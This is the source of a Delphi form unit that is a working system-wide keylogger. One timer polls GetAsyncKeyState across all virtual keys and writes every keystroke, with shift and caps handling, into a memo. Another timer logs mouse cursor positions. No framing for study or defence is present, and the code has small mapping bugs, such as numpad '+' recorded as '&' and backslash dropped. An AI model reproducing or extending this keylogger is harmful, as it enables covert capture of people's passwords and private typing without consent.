unit Unit2;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls;

type
  TForm2 = class(TForm)
    Memo1: TMemo;
    Memo2: TMemo;
    Timer1: TTimer;
    Timer2: TTimer;
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;

implementation

{$R *.dfm}

procedure TForm2.Timer1Timer(Sender: TObject);
var
Mouse : TMouse;
begin
 Mouse := TMouse.Create;
 Memo2.Lines.Add(IntToStr(Mouse.CursorPos.X) + ','+IntToStr(Mouse.CursorPos.Y));
end;

procedure TForm2.Timer2Timer(Sender: TObject);
var       i : byte;
begin
  for i:=8 To 222 do
    begin
       if GetAsyncKeyState(i)=-32767 then
        begin
        case i of
        8  :   begin
        memo1.Lines[memo1.Lines.count-1] := copy(memo1.Lines[memo1.Lines.count-1],1,length(memo1.Lines[memo1.Lines.count-1])-1); //Backspace
      //  memo1.text:=memo1.text+'[Bakspace]';
        end;
        9  : memo1.text:=memo1.text+' [Tab] ';
        13 : begin  //foi pressionado o enter
              memo1.text:=memo1.text+ ' [Enter] '+#13#10; //Enter
             end;
        17 : memo1.text:=memo1.text+' [Ctrl] ';
        27 : memo1.text:=memo1.text+' [Esc] ';
        32 :memo1.text:=memo1.text+' '; //Space
        // Del,Ins,Home,PageUp,PageDown,End
        33 : memo1.text := Memo1.text + ' [Page Up] ';
        34 : memo1.text := Memo1.text + ' [Page Down] ';
        35 : begin//foi pressionado o end o programa vai finalizar.
             memo1.text := Memo1.text + ' [End] ';
             application.Terminate;
             end;
        36 : memo1.text := Memo1.text + ' [Home] ';
        //Arrow Up Down Left Right
       // 37 : memo1.text := Memo1.text + '[Left]';
       // 38 : memo1.text := Memo1.text + '[Up]';
        //39 : memo1.text := Memo1.text + '[Right]';
        //40 : memo1.text := Memo1.text + '[Down]';
        44 : memo1.text := Memo1.text + ' [Print Screen] ';
        45 : memo1.text := Memo1.text + ' [Insert] ';
        46 : memo1.text := Memo1.text + ' [Del] ';
        145 : memo1.text := Memo1.text + ' [Scroll Lock] ';

        //Number 1234567890 Symbol !@#$%^&*()
        48 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+')'
             else memo1.text:=memo1.text+'0';
        49 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'!'
             else memo1.text:=memo1.text+'1';
        50 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'@'
             else memo1.text:=memo1.text+'2';
        51 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'#'
             else memo1.text:=memo1.text+'3';
        52 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'$'
             else memo1.text:=memo1.text+'4';
        53 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'%'
             else memo1.text:=memo1.text+'5';
        54 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'^'
             else memo1.text:=memo1.text+'6';
        55 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'&'
             else memo1.text:=memo1.text+'7';
        56 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'*'
             else memo1.text:=memo1.text+'8';
        57 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'('
             else memo1.text:=memo1.text+'9';
        65..90 : // a..z , A..Z
            begin
            if ((GetKeyState(VK_CAPITAL))=1) then
                if GetKeyState(VK_SHIFT)<0 then
                   memo1.text:=memo1.text+LowerCase(Chr(i)) //a..z
                else
                   memo1.text:=memo1.text+UpperCase(Chr(i)) //A..Z
            else
                if GetKeyState(VK_SHIFT)<0 then
                    memo1.text:=memo1.text+UpperCase(Chr(i)) //A..Z
                else
                    memo1.text:=memo1.text+LowerCase(Chr(i)); //a..z
            end;
        //Numpad
        96..105 : memo1.text:=memo1.text + inttostr(i-96); //Numpad  0..9
        106:memo1.text:=memo1.text+'*';
        107:memo1.text:=memo1.text+'&';
        109:memo1.text:=memo1.text+'-';
        110:memo1.text:=memo1.text+'.';
        111:memo1.text:=memo1.text+'/';
        144 : memo1.text:=memo1.text+' [Num Lock] ';

        112..123: //F1-F12
            memo1.text:=memo1.text+' [F'+IntToStr(i - 111)+'] ';

        186 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+':'
              else memo1.text:=memo1.text+';';
        187 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'+'
              else memo1.text:=memo1.text+'=';
        188 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'<'
              else memo1.text:=memo1.text+',';
        189 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'_'
              else memo1.text:=memo1.text+'-';
        190 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'>'
              else memo1.text:=memo1.text+'.';
        191 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'?'
              else memo1.text:=memo1.text+'/';
        192 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'~'
              else memo1.text:=memo1.text+'`';
        219 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'{'
              else memo1.text:=memo1.text+'[';
        220 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'|'
              else memo1.text:=memo1.text+'';
        221 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'}'
              else memo1.text:=memo1.text+']';
        222 : if GetKeyState(VK_SHIFT)<0 then memo1.text:=memo1.text+'"'
              else memo1.text:=memo1.text+'''';
        end;
        end;
    end;


end;

end.
